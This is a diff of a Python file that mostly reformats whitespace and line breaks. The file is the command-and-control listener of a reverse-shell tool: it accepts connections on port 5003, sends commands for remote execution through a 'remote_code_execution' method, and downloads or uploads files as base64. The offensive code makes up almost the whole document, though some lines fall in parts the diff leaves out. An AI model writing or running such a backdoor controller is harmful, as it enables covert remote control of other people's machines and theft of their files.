@@ -8,6 +8,7 @@ import socket
 SERVER_HOST = "0.0.0.0"
 SERVER_PORT = 5003
 
+
 class Connections_Listener:
     def __init__(self, ip, port):
         listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -17,11 +18,11 @@ class Connections_Listener:
         print("[+] Waiting for a connection")
         self.connection, address = listener.accept()
         print("[+] Got a connection" + str(address))
-    
+
     def send_data(self, data):
         json_data = json.dumps(data)
         self.connection.send(json_data.encode('utf-8'))
-    
+
     def receive_data(self):
         json_data = ""
         while True:
@@ -31,25 +32,25 @@ class Connections_Listener:
             except ValueError:
                 # code to display that data transfer is going on
                 continue
-    
+
     def remote_code_execution(self, command):
         self.send_data(command)
         if command[0].lower() == 'exit':
             self.connection.close()
             sys.exit()
         return self.receive_data()
-    
+
     @staticmethod
     def download_file(self, path, content):
         with open(path, 'wb') as f:
             f.write(base64.b64decode(content))
             return f"[+] \"{path}\" file download successful"
-    
+
     @staticmethod
     def upload_files(self, path):
         with open(path, 'rb') as f:
             return base64.b64encode(f.read())
-    
+
     def upload_crap(self, path):
         try:
             if os.path.isfile(path):
@@ -73,12 +74,14 @@ class Connections_Listener:
                     input_command.append(content)
                 result = self.remote_code_execution(input_command)
                 if input_command[0].lower() == 'download':
-                    result = self.download_file(input_command[-1], result.encode('utf-8'))
+                    result = self.download_file(
+                        input_command[-1], result.encode('utf-8'))
                 print(result)
             except Exception as error:
                 print(error)
                 print(type(error))
                 # print("\n----- [=] Connection is still intact [=] -----")
+
 
 try:
     listen = Connections_Listener(SERVER_HOST, SERVER_PORT)
